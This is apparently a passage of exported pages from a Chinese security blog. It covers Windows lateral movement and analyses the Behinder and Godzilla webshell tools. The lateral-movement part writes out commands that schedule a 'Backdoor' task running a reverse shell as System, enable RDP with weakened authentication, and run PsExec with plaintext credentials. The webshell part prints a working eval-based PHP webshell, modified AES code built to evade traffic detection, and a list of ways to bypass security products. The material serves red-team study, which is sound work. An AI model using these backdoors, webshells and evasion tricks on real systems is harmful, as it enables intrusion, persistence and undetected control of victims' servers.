/TN：指定计划任务名称 /SC 指定计划任务执行频率 /MO 制定计划任务执行周期 /TR指定计划任务程序路径 /RU计划任务权限  /F如果已存在则强制创建</span><br><span class="line">如果没有建立IPC就要指定手动指定远程主机用户凭据</span><br><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F /U Administrator /P Admin123</span><br><span class="line">3 执行以下命令</span><br><span class="line">schtasks /RUN /S 10.10.10.19 /I /TN Backdoor</span><br><span class="line">4.以下命令 将计划任务删除</span><br><span class="line">schtasks /Delete /S 10.10.10.19 /TN Backdoor /F</span><br></pre></td></tr></table></figure><p>也可以通过计划任务在主机上执行系统命令 将结果写入文件 然后通过type命令远程读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe  /c &#x27;whoami &gt; C:\result.txt&#x27;&quot; /RU System /f</span><br><span class="line">type \\10.10.10.19\C$\result.txt</span><br></pre></td></tr></table></figure><h4 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h4><p>Windows使用UNC访问网络共享资源</p><p><code>\\servername\sharename\directory\filename</code></p><p>servername是服务器主机名 sharename是共享网络名称 firectory是共享下的目录filename是文件</p><p>远程主机上攻击载荷 可以直接使用UNC代替常规本地路径 让主机直接在测试人员搭建的SMB共享中加载载荷并执行 可以省去手动上传载荷的步骤</p><h2 id="远程桌面RDP利用"><a href="#远程桌面RDP利用" class="headerlink" title="远程桌面RDP利用"></a>远程桌面RDP利用</h2><p>默认 tcp3389</p><p>可能 会将已登录的用户强制退出 容易被发现</p><p>查询是否开启RDP</p><p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</code></p><p><img src="image-20230318172335015.png" alt="image-20230318172335015"></p><p>若为 0x0是已经启动 若为1 则RDP已经被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启远程桌面连接</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭 仅允许使用网络级别身份验证的rdp连接 （鉴权）</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWOORD /d 0</span><br><span class="line">#设置防火墙放行3389 </span><br><span class="line">netsh advfirewall firewall add rule name =&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>远程主机通过WMI开启 </p><p><code>wmic /Node:10.10.10.19 /User:Administrator /Password:123456 RDTOGGLE WHRER ServerName=&#39;WIN2016=WEB3&#39; call SetAllowTSConnections 1</code></p><h3 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h3><p> system权限 </p><p>query user</p><p>执行tscon</p><blockquote><p>SharpRDP 开源工具 开启远程桌面放行3389直接连接</p></blockquote><h2 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h2><p>原理 通过smb连接到服务器Admin$共享 并释放 “psexesvc.exe”二进制文件 注册名为 “PSEXESVC”服务 当客户端执行命令 服务端通过服务执行命令 回显数据</p><p>条件 </p><p>1.远程主机开启Admin$共享</p><p>2.防火墙未开启或开启445</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -acceptula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"></span><br><span class="line">-acceptula 禁止弹出许可证对话框 -u 指定用户名 -p指定密码 </span><br><span class="line">-s 以system启动进程 如果未指定 就是管理员权限</span><br></pre></td></tr></table></figure><p>内网渗透中 如果已有相应凭据 可以直接使用psexex连接远程主机</p><p>Imapacket 和MSF中内置了psexec模块 </p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>windows管理规范  </p><p>横移时 可以利用WMI提供的管理功能 通过以获取的用户凭据 与本地或远程主机进行交互 并控制其执行各种行为</p><p>两种利用方法</p><p>1 调用WMI的类方法进行远程执行 如 Win32_Proces中的Create方法可以在远程主机创建进程</p><p>Win32_Product类中Install方法可以在远程主机安装恶意MSI</p><p>2.远程部署WMI事件订阅 在特定条的事件发生时触发攻击</p><p>条件 1.WMI服务开启  2 .主机放行135端口</p><p>未完待续</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Webshell工具学习</title>
      <link href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="Behinder4-0"><a href="#Behinder4-0" class="headerlink" title="Behinder4.0"></a>Behinder4.0</h2><p>v4.0相对于3.0版本，更新了较多内容，其中包括了开放了传输协议的自定义功能</p><p>aes特征一直是厂商查杀的重点，在主机层，aes相关的API也是一个强特征</p><p>4.0泛化这个特征提供了传输协议自定义功能，<strong>让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。</strong></p><p><strong>v4.0版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码</strong></p><p>工作流程</p><p><img src="640.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1本地对Payload进行加密，然后通过POST请求发送给远程服务端；</span><br><span class="line">2服务端收到Payload密文后，利用解密算法进行解密；</span><br><span class="line">3服务端执行解密后的Payload，并获取执行结果；</span><br><span class="line">4服务端对Payload执行结果进行加密，然后返回给本地客户端；</span><br><span class="line">5客户端收到响应密文后，利用解密算法解密，得到响应内容明文</span><br></pre></td></tr></table></figure><p>前三步的基础是 shell.php，通过 post 请求传 body</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function decrypt($data)</span><br><span class="line">&#123;</span><br><span class="line">    $key=&quot;25f9e794323b4538&quot;; </span><br><span class="line">    $bs=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$after=$bs($data.&quot;&quot;);</span><br><span class="line">for($i=0;$i&lt;strlen($after);$i++) &#123;</span><br><span class="line">    $after[$i] = $after[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">    return $after;</span><br><span class="line">&#125;</span><br><span class="line">$post=Decrypt(file_get_contents(&quot;php://input&quot;));</span><br><span class="line">    eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在第一次传输的时候，做了密钥协商与指纹确认的事情，冰蝎需要先确定你（受攻击端）确实是能够和我（本地攻击者）进行加解密，或者说可以进行数据传输，这也就是第一次发包。</p><p>对应的代码如下，这是冰蝎当中 payload/php 下的代码 ———— Echo.php</p><p><img src="4fbadde1968e8754d4e208b9eb7961f0.png" alt="img"></p><p>在实际传输过程中会发现冰蝎发包时多了一个 <code>encrypt()</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function main($content)</span><br><span class="line">&#123;</span><br><span class="line">    $result = array();</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode($content);</span><br><span class="line">    @session_start();    //初始化session，避免connect之后直接background，后续get result无法获取cookie</span><br><span class="line">    echo encrypt(json_encode($result));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data)</span><br><span class="line">&#123;    </span><br><span class="line">    $key=&quot;25f9e794323b4538&quot;; </span><br><span class="line">    for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">        $data[$i] = $data[$i]^$key[$i+1&amp;15];     </span><br><span class="line">    &#125;    </span><br><span class="line">    $bs=&quot;base64_&quot;.&quot;encode&quot;;</span><br><span class="line">    $after=$bs($data.&quot;&quot;);    </span><br><span class="line">    return $after;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content=&quot;WWtpektNWU1PREpybFB6VlQwdXY1T2JoMkNsMzVmZmVPZ0pDQnZaZElKejhVaGc1ZU42NnlCYWI3YVVqakJ4U3BRcnpneEdJT3pmclR5QWFVQ2Nqa2pTVm1OTU9LNzlrNHhzRjJjd2F2OTF2WFRITG9KdWpmMHpFeU9lTmFWRmdYQUdPT0loaHJKM0JSMkZNaUo5VjZwWGtwb2xQUWNyWGY1UzBuV05SYkE5eHFacmZUM3B4UG1jR3l2RTcxUUtCSkhMa0NJdms5NzdYM2FmZWFmazd4bkpHYlc0MVloNWV4YUp5Q05MTEZVemVaQkNOOUVvUjhNell4cUY3NzJFenp3bXFPbVQ1emxPNjVDUE5DR2JGVzlpc1k2MVlMTVY5WHBKYzRrdjVjcEJmU3NGTkRFbHhvM282MlZvV1FGUjRqTHY3eVY5am9BUVRLcFRiaWVmTmJuQVJidmJQZmlNeFhKTm9QbzVMZWNmNDIxNlZNY000cXJySzVYeEY3ajA1TlpWd3R6MExZZUdNaXlWTmE3bzgyb0xQVVk3ZThaaUhta0x6OVdnbVd5SmpIUVQ5UWhORm8ybVRtNTZPMDhIRHpyMkVhRmpYd3YyWWQ4SjZCZjdHWEtNTGo1OXpHdEgxb2Nqa2dyTHpUMWcwaGtSeTZaRVdyY2NRaEJOZHVwcTlvME9wY1loYTNiSXU0c1lkQk04OFNSaDJGUUxxR0k1TzdIMWVvN0NJTjRRSmpvbUtqMXVVWEFwREVHeGFCMlJZdXU5VWh1MHJwMkdESEdkUHVzaEJBTEdwYUJjZkRBR0ZacjF6ME5XQlBJcnNMS2NoZ2NsNEdFZkY0YmJCVkR1ZXo0bFV3Tm1wc1pzQ0FqRWNDTXNkWmtBUUJwb3Y5YndOTW9peWVSVUcwTUVUQjdYZ096YjVxQjFMaHByWVV2OFV3N1pGNFJYQkNZcnlCd0xHckdkbjVMaHdIazFNVUxvRkpoU0dPaURlRzAzMnhZbEM5ekRjVmUxMlhkbFMwa2YxVGJRUzlyck5OSDF2TzNKZ1NiOTJ2NkhjMWxXaWxJVDlLa1hwVnFZOEhEc1U4bVg4MHF0bktsbkdCcHVsRUUyb2djZlkwR2FVY1RxM09aZXFMeUtlNWFBdzNhTEM2VlFrZFI2MHZwVENlZ1ZMWTBiN3lOTHBMN3A4TmFVMHVOUmNaNXl6cTRQSEhJNk5UakltTEhDUzlPRTREeUtGcm0xbk1KOUdPZEJsdEljOG5FclNiVFl2Q1padkY3YlNnYmhsanEwbWphem1vb21wWld0ZWlCSjM5NGxlbEpYWVVHWFN3dzIyOVd5SzZBdUNZSEU3S3V0TERHbWhCbnI1b0RScm1ySFh6bmx1aDUwTm4wb09ZZDYwTDFNcnpiQzJuQTdXOWVSRk45M0drc2p0MDhRSTByaW1QbDg3Ykw2MmZid0RXcFRxZjhwa3E3eXJWZ0p0N3Z0WVdHeVVxd0lnaE9ibVI4b1pvR0tiTFpOTW53akZlcDJ4ZWVzMnF2dktwTDBkNVZCblhiMmhhcHkzdFplOXpJQVpzWHE5OFFSTTJSUzMzWkt0cXhERWZLWElpcnh4aEhhZndyc1Q4OVN4bUVGUTVTOThsM016dDMwR0JMbUxENnNLQmZLYkQ4ekRRU0xJdGo5ME41Zzg2eng4NjRTeURBa0hPTGJYUnVISWRJeE1Manp6aTV6YjNnbENwTTFXenpVZVlacExyVW13QXJrTEJaanFhQTdQZTlUZWY2ZlJURWhwQmNxUUE2N09ZZnduVFB3akdwazY3Q2wxS3ZmSzFOeDRWQVRVR2tGZjY1enZoa0NDWVNqYWVGN0hCUFEzc3lJa2puVUI3TEdZSERVNDVVNHI1ZUxOTGVCc0Fhb1NSeUtuT3RCQ3Jsd05HTWxGejFYclZkc0NRMUIwWXRGS3FUd25NZVVmd3NzcGdPZWNFTW0xYnd3WnJKVlZSVG0zY29ZWk5HellrZExCS011WFN5dWVaRFVnc1dDWFdRTlJNcmUyVWJXa0hvYnA5QmF5U25GZ01MaXVKV2pXNFRqek9mekFJa2h2c2FwNlF4VTBjVVZxNXJhaGJGaW9VYTREVERPbTJoS055bk1uQWdVTnZFR1BUNXR2eWNQWEpVa2R4em9yb3dMc2RzY2dWYldGMXFSdEJKc0xQQlJsZ2Y4OWE4QWUxUHNqNms1OE9CRGhBMzRiOERYMTJ4OTZDYUNzZFBWMlJFWFEzdENHSFdZblJNb1FOclFSdXhZZjhPQmVNVm9IUjBiblJnV0RLWGI3ZWZhc2owYUl4Q1c2eDNRQkdQTXNsQmtoQW5UUnVYc0xFRGN5eENlNjBDdHhXN3hpaHA5Skc3S2tKbW5PUlNneWZiYXRvZG9EMHVHajhCQUYzRThuM3NHbVNCdEFkdk9OWjB0T3BPUVgzaW10Rks1QUFTeGJ4RHZZTGM4d2RBQXI4ZmUxQU5kRmVJUGhiUWxha0hIUmp3bmVhNnpNcTA4R0ZreFFPTFhOOExSMlZVdlBUYlowV1FPUXh0azhQVW0zaVM3YkhaeVAzVzdsVkJ0N2EwQjE5aUJicWkxbjNQenpLdWhURXJKTzE5Mm5JemxOREpTQm55cUJ4U0IwcERjZ0RoWHFQdG42VHAzQkh4eEJWUzVpVFczU1FPeHlVVmwydGdoWVphb3NzTGlsWWdVcnVBMEQwYjdKVlpqZ1lMV0dhcmdrZjZpa3dVSDNWZVZlN0FIemZWRHdJVFlpUTNPOFJSUjkwOEwwWkp0Y1ZSUzBZMWYwMDBQaHFSWGE2aDhpZWpnWXQ1V3UzWlZYZ1BJM0N3c1ZnVVB0eElWM0xUMHkyV3VDcDJLc2RDVEQyRXBKMzVKUnpCTWd3dTFhajBvaWlyaXBGY04zbmpyQjBESE1Xck5tMFRNUWZvTU9uSTYzcXhxTE1kcngyelhmTlFmbTNKTWRKTDRONUtYSXZRYmI4Q090bHNsVG1oRmVMbEQzUWFWTmJEYUxXdEZhRTltNHdIRHl2eGM3b3lGVHBZYWdWTUNHM3BrMVJscTM2OFRYS1RhSmRTYVgyNmcyalhZNjBjb0RZalJ3QkpPWVlkb01DUzVoRGY3SWdZSkNNMUxLenlXZEtQSUtDaUpoTnQ5S2FXNlFnR0pNZUxxUVJ3R0FnNDQ3cmc1M2c0a1ptSW5oNDBTbGFpQnB3a3p5MWVnb0JvVXhZa2FOZnVJTGFvNXhZb2FYOHRZTjhBNHlxTjlJRWszY0tuVVNqTjRST0RMUHh0ZGlHRnNWSWxabkpQVFVjUnVyclRWbGV3SE05UXVydU14d1hXdjdHT205cjdISG9sOUsxbUExNDh4bGMzZU5IeVl3VmJRVHFoeUlWZGQ5b0JMeTlqOXZ0UkFnV250TE5tWmtZRUxvbXdHV0xUN2k5MnJGZ2VLZERPd1M1ZUtsVg==&quot;;</span><br><span class="line">$content=base64_decode($content);</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure><p>在这一次内容传输结束之后，冰蝎确认被攻击端与本地可以建立传输，才会发第二次包，也就是执行 <code>phpinfo()</code> 命令，代码略。</p><p>接着</p><ul><li>4、服务端对 Payload 执行结果进行加密，然后返回给本地客户端；</li><li>5、客户端收到响应密文后，利用解密算法解密，得到响应内容明文。</li></ul><p><strong>一个传输协议必须包含一对本地加解密函数，至少包含一对远程加解密函数（Java、PHP、C#、ASP中的一个或者多个）。</strong></p><blockquote><p>.传输协议的加解密函数名称分别为Encrypt和Decrypt，且都只有一个入参，参数类型为二进制字节流。在函加密数体内可以对字节流做任何加密，比如aes、rsa或者各种封装、拼接、自定义算法等等，最终将加密结果返回。在解密函数中利用对称算法将加密函数的结果进行解密，并将解密结果返回。为了能清晰展示传输协议的结构，上图中的传输协议其实未做任何加解密处理，直接将入参返回，是一个纯明文的传输协议。</p></blockquote><h3 id="冰蝎马的改写与绕过-tips"><a href="#冰蝎马的改写与绕过-tips" class="headerlink" title="冰蝎马的改写与绕过 tips"></a>冰蝎马的改写与绕过 tips</h3><p>作者提出了一种非常巧妙的绕过方式</p><blockquote><p>在 AES 加密的时候增加一个小尾巴，这个尾巴存在自定义的可能性，也就让很多设备难以进行检测了。</p></blockquote><h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p>本地默认的 aes 传输协议加密算法如下：</p><pre><code>private byte[] Encrypt(byte[] data) throws Exception&#123;    String key=&quot;e45e329feb5d925b&quot;;    byte[] raw = key.getBytes(&quot;utf-8&quot;);    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, &quot;AES&quot;);    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);// &quot;算法/模式/补码方式&quot;    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);    byte[] encrypted = cipher.doFinal(data);    Class baseCls;    try    &#123;        baseCls=Class.forName(&quot;java.util.Base64&quot;);        Object Encoder=baseCls.getMethod(&quot;getEncoder&quot;, null).invoke(baseCls, null);        encrypted= (byte[]) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);    &#125;    catch (Throwable error)    &#123;        baseCls=Class.forName(&quot;sun.misc.BASE64Encoder&quot;);        Object Encoder=baseCls.newInstance();        String result=(String) Encoder.getClass().getMethod(&quot;encode&quot;,new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);        result=result.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);        encrypted=result.getBytes();    &#125;    return encrypted;&#125;</code></pre><p>服务端是 PHP，使用默认的 aes 算法，但是由于默认使用的是 aes128 的算法，会导致密文长度恒是 16 的整数倍，流量设备可能通过这个特征来对冰蝎做流量识别，我现在想对默认算法做一个简单修改，在密文最后最加一个 magic 尾巴，随机产生一个随机长度的额外字节数组</p><p>修改后<strong>本地</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">private byte[] Encrypt(byte[] data) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    String key=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">    byte[] raw = key.getBytes(&quot;utf-8&quot;);</span><br><span class="line">    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);// &quot;算法/模式/补码方式&quot;</span><br><span class="line">    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line">    byte[] encrypted = cipher.doFinal(data);</span><br><span class="line">    Class baseCls;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        baseCls=Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object Encoder=baseCls.getMethod(&quot;getEncoder&quot;, null).invoke(baseCls, null);</span><br><span class="line">        encrypted= (byte[]) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Throwable error)</span><br><span class="line">    &#123;</span><br><span class="line">        baseCls=Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">        Object Encoder=baseCls.newInstance();</span><br><span class="line">        String result=(String) Encoder.getClass().getMethod(&quot;encode&quot;,new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);</span><br><span class="line">        result=result.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);</span><br><span class="line">        encrypted=result.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    //增加魔法尾巴</span><br><span class="line">    int magicNum=Integer.parseInt(key.substring(0,2),16)%16;</span><br><span class="line">    java.util.Random random=new java.util.Random();</span><br><span class="line">    byte[] buf=new byte[magicNum];</span><br><span class="line">    for (int i=0;i&lt;buf.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i]=(byte)random.nextInt(256);</span><br><span class="line">    &#125;</span><br><span class="line">    java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();</span><br><span class="line">    output.write(encrypted);</span><br><span class="line">    output.write(buf);</span><br><span class="line">    return output.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>远程</strong></p><p>由于我们目前假设的是一个 PHP 的目标环境，远程加密函数采用 PHP 格式编写，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Encrypt($data)  </span><br><span class="line">&#123;  </span><br><span class="line">$key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  </span><br><span class="line">$encrypted=base64_encode(openssl_encrypt($data, &quot;AES-128-ECB&quot;, $key,OPENSSL_PKCS1_PADDING));  </span><br><span class="line">$magicNum=hexdec(substr($key,0,2))%16; //根据密钥动态确定魔法尾巴的长度  </span><br><span class="line">for($i=0;$i&lt;$magicNum;$i++) &#123;  </span><br><span class="line">$encrypted=$encrypted.chr(mt_rand(0, 255)); //拼接魔法尾巴  </span><br><span class="line">&#125;  </span><br><span class="line">return $encrypted;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解密算法</strong><br>在加密算法中，我们在原版 aes 的基础上，在密文最后追加了一段魔法尾巴，尾巴长度为秘钥的前两位十六进制对应的数值对 16 取模的值。在解密时，我们只需要在原版 aes 解密函数的基础上，把密文最后的尾巴截掉即可。分别对 Java 版本和 PHP 版本的解密函数做修改。<br><strong>本地</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private byte[] Decrypt(byte[] data) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    String k=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">    int magicNum=Integer.parseInt(k.substring(0,2),16)%16; //取magic tail长度</span><br><span class="line">    data=java.util.Arrays.copyOfRange(data,0,data.length-magicNum); //截掉magic tail</span><br><span class="line">    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),&quot;AES&quot;));</span><br><span class="line">    byte[] decodebs;</span><br><span class="line">    Class baseCls ;</span><br><span class="line">            try&#123;</span><br><span class="line">                baseCls=Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                Object Decoder=baseCls.getMethod(&quot;getDecoder&quot;, null).invoke(baseCls, null);</span><br><span class="line">                decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Decoder, new Object[]&#123;data&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Throwable e)</span><br><span class="line">            &#123;</span><br><span class="line">                baseCls = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">                Object Decoder=baseCls.newInstance();</span><br><span class="line">                decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decodeBuffer&quot;,new Class[]&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;new String(data)&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">    return c.doFinal(decodebs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>远程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Decrypt($data)  </span><br><span class="line">&#123;  </span><br><span class="line">$key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  </span><br><span class="line">$magicNum=hexdec(substr($key,0,2))%16; //取magic tail长度  </span><br><span class="line">$data=substr($data,0,strlen($data)-$magicNum); //截掉magic tail  </span><br><span class="line">return openssl_decrypt(base64_decode($data), &quot;AES-128-ECB&quot;, $key,OPENSSL_PKCS1_PADDING);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作者的文章当中也提供了很有启发性的思维 尽量以算法的方式改写冰蝎的攻击。</p><h3 id="魔改思路"><a href="#魔改思路" class="headerlink" title="魔改思路"></a>魔改思路</h3><p>针对不同安全产商设备的检测原理，整理了以下几种魔改思路：</p><ol><li>加密解密算法，除了默认的AES，可以使用DES、3DES、TDEA、Blowfish、Twofish、RC2、RC4、RC5、IDEA、SKIPJACK等对称加密算法</li><li>去除base64编码特征，请求体和响应体数据随机产生不定长度的额外字节数组</li><li>去除请求头User-Agent、Accept、Referer、Content-type等特征</li><li>请求包以json格式参数，响应体数据返回json格式或者html格式，数据可以拆散隐藏在html标签中</li><li>修改请求协议，使用HEAD协议，长度较小的paylaod放到header执行，Shell返回404，响应数据通过ceye类似接口进行中转/服务器可访问的目录图片中转</li><li>客户端不定时发送不定长度的垃圾数据</li><li>基于sessionID生成密钥、payload参数名、分隔符等</li><li>使用Java底层函数绕OpenRASP</li><li>webshell免杀</li></ol><p>冰蝎作者<a href="https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A</a></p><p>历史冰蝎<a href="https://www.4hou.com/shop/posts/N1rN">https://www.4hou.com/shop/posts/N1rN</a></p><h2 id="Godzilla"><a href="#Godzilla" class="headerlink" title="Godzilla"></a>Godzilla</h2><p>由于哥斯拉在处理 jsp 和 php 时加密方式存在差异，本文将从 php 版的 shell 展开，对其运行原理再做一下总结和阐述。首先，生成一个 php 静态 webshell，加密器选择 <code>PHP_XOR_BASE64</code></p><h3 id="HTTP请求头特征"><a href="#HTTP请求头特征" class="headerlink" title="HTTP请求头特征"></a>HTTP请求头特征</h3><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>哥斯拉客户端使用 JAVA 语言编写，在默认的情况下，如果不修改 User-Agent，User-Agent 会类似于 Java/11.0.7（具体什么版本取决于 JDK 环境版本）。但是哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的</p><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><code>Accept</code> 头为 <code>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code> 对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的 Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是 JDK 